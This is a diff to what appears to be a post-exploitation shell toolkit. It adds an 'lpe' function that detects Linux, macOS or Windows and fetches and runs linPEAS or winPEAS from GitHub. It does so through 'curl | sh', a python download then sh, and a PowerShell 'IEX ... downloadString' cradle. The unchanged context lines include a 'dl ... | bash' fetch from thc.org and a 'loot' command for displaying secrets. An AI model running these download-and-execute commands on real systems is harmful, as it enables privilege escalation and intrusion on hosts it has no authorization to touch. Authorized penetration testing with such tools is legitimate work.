@@ -677,6 +677,70 @@ loot() {
     lootlight
 }
 
+# Try to find LPE
+# https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+# https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASps1
+lpe() {
+    echo -e "${CB}Determining operating system...${CN}"
+
+    # Detect the OS
+    OS="$(uname -s)"
+    case "$OS" in
+        Linux)
+            echo -e "${CB}Linux detected. Running linPEAS...${CN}"
+            # Try to use curl first
+            if command -v curl >/dev/null 2>&1; then
+                echo -e "${CB}Using curl to download linPEAS...${CN}"
+                curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+            elif command -v python >/dev/null 2>&1; then
+                echo -e "${CB}Using python to download linPEAS...${CN}"
+                python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
+                sh linpeas.sh
+            elif command -v python3 >/dev/null 2>&1; then
+                echo -e "${CB}Using python3 to download linPEAS...${CN}"
+                python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
+                sh linpeas.sh
+            else
+                echo -e "${CR}Error: Neither curl nor python/python3 is available to download linPEAS.${CN}"
+                return 1
+            fi
+            ;;
+        Darwin)
+            echo -e "${CB}macOS detected. Running linPEAS...${CN}"
+            # macOS is Unix-based, so it can use linPEAS like Linux
+            if command -v curl >/dev/null 2>&1; then
+                echo -e "${CB}Using curl to download linPEAS...${CN}"
+                curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+            elif command -v python >/dev/null 2>&1; then
+                echo -e "${CB}Using python to download linPEAS...${CN}"
+                python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
+                sh linpeas.sh
+            elif command -v python3 >/dev/null 2>&1; then
+                echo -e "${CB}Using python3 to download linPEAS...${CN}"
+                python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
+                sh linpeas.sh
+            else
+                echo -e "${CR}Error: Neither curl nor python/python3 is available to download linPEAS.${CN}"
+                return 1
+            fi
+            ;;
+        CYGWIN*|MINGW*|MSYS*|MINGW32*|MINGW64*|MSYS_NT*)
+            echo -e "${CB}Windows detected. Running winPEAS...${CN}"
+            if command -v powershell >/dev/null 2>&1; then
+                echo -e "${CB}Using PowerShell to download and execute winPEAS...${CN}"
+                powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
+            else
+                echo -e "${CR}Error: PowerShell is not available to run winPEAS.${CN}"
+                return 1
+            fi
+            ;;
+        *)
+            echo -e "${CR}Error: Unsupported operating system: $OS.${CN}"
+            return 1
+            ;;
+    esac
+}
+
 
 ws() {
     dl https://thc.org/ws | bash
@@ -947,6 +1011,7 @@ ${CDC} loot                                  ${CDM}Display common secrets
 ${CDC} ws                                    ${CDM}WhatServer - display server's essentials
 ${CDC} bin                                   ${CDM}Download useful static binaries
 ${CDC} lt, ltr, lss, lssr, psg, lsg, ...     ${CDM}Common useful commands
+${CDC} lpe                                   ${CDM}Find LPE on this system
 ${CDC} xhelp                                 ${CDM}This help"
     echo -e "${CN}"
 }
